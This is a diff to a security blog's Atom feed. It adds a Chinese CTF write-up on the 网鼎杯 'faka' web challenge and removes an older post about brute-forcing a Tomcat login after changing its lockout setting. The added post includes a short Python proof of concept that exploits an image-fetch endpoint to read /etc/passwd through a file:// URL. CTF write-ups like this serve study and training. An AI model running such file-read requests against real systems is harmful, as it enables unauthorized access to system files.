@@ -80,6 +80,37 @@
   </entry>
   
   <entry>
+    <title>ctf-网鼎杯线下半决赛-web</title>
+    <link href="https://xiaokou.top/posts/69603afc/"/>
+    <id>https://xiaokou.top/posts/69603afc/</id>
+    <published>2020-11-30T07:17:49.000Z</published>
+    <updated>2021-03-11T05:08:04.017Z</updated>
+    
+    <content type="html"><![CDATA[<p>线下决赛没去嗷,但是还是看到题了.</p><h3 id="faka"><a href="#faka" class="headerlink" title="faka"></a>faka</h3><p><img src="http://124.70.145.45:8081/uploads/9b4f6f7c3c5da3f6f683623906d97009" alt="image.png"><br>打开就是发卡<br>源码审计一下<br><img src="http://124.70.145.45:8081/uploads/f4869aa59f098ec1bf9bf02bef6f4dd0" alt="image.png"><br>太多了,grep看下application<br><img src="http://124.70.145.45:8081/uploads/f14fde2ba585ab6df2a0e8b0f70f56b0" alt="image.png"><br>发现一处文件读取,传入url地址 请求本地文件，会生成jpg文件<br><img src="http://124.70.145.45:8081/uploads/859ac417e63e6291279560c1c90243b3" alt="image.png"><br>再次请求，直接获取passwd文件内容，前台文件读取一枚。<br><img src="http://124.70.145.45:8081/uploads/374328e6f9489adb42da84c347499232" alt="image.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">path = <span class="string">"file:///etc/passwd"</span></span><br><span class="line">res = s.get(<span class="string">"http://127.0.0.1/index.php/wechat/review/img?url="</span>+path)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></tbody></table></figure><p><img src="http://124.70.145.45:8081/uploads/31c3a75df54f3a60a8fa59e3532e0c6c" alt="image.png"></p><p>审计工具是<br><code>https://github.com/suanve/recode</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;线下决赛没去嗷,但是还是看到题了.&lt;/p&gt;
+&lt;h3 id=&quot;faka&quot;&gt;&lt;a href=&quot;#faka&quot; class=&quot;headerlink&quot; title=&quot;faka&quot;&gt;&lt;/a&gt;faka&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://124.70.145.45:8081/u
+      
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="https://xiaokou.top/tags/ctf/"/>
+    
+      <category term="writeup" scheme="https://xiaokou.top/tags/writeup/"/>
+    
+      <category term="网鼎杯" scheme="https://xiaokou.top/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
+    
+      <category term="线下" scheme="https://xiaokou.top/tags/%E7%BA%BF%E4%B8%8B/"/>
+    
+  </entry>
+  
+  <entry>
     <title>从bytectf学到的scrapy-redis反序列化漏洞</title>
     <link href="https://xiaokou.top/posts/20216f54/"/>
     <id>https://xiaokou.top/posts/20216f54/</id>
@@ -541,33 +572,6 @@
       <category term="openwrt" scheme="https://xiaokou.top/tags/openwrt/"/>
     
       <category term="极路由" scheme="https://xiaokou.top/tags/%E6%9E%81%E8%B7%AF%E7%94%B1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>安全基线-tomcat爆破</title>
-    <link href="https://xiaokou.top/posts/976b71c6/"/>
-    <id>https://xiaokou.top/posts/976b71c6/</id>
-    <published>2019-08-07T22:38:00.000Z</published>
-    <updated>2021-03-10T03:58:53.793Z</updated>
-    
-    <content type="html"><![CDATA[<p>做环境的时候遇到一个问题，tomcat多次登陆以后一直报密码错误，无法登陆。</p><a id="more"></a><p><img src="/post-images1565246382556.png" alt=""></p><p>群里有一个老哥回复：<br><img src="/post-images1565246405085.png" alt=""><br><img src="/post-images1565246409097.png" alt=""></p><p>看了一下默默的去搜索一下tomcat安全基线，发现如下信息：<br><a href="https://blog.csdn.net/Gary_H/article/details/87372142" target="_blank" rel="noopener" title="tomcat安全基线">点我看tomcat安全基线</a><br><img src="/post-images1565246445257.png" alt=""><br>那就在server.xml里添加<br><img src="/post-images1565246486354.png" alt=""><br>然后可以随意爆破了。<br><img src="/post-images1565246502346.png" alt=""><br><img src="/post-images1565246507549.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;做环境的时候遇到一个问题，tomcat多次登陆以后一直报密码错误，无法登陆。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="基线" scheme="https://xiaokou.top/categories/%E5%9F%BA%E7%BA%BF/"/>
-    
-    
-      <category term="tomcat" scheme="https://xiaokou.top/tags/tomcat/"/>
-    
-      <category term="安全基线" scheme="https://xiaokou.top/tags/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/"/>
-    
-      <category term="爆破" scheme="https://xiaokou.top/tags/%E7%88%86%E7%A0%B4/"/>
     
   </entry>
   
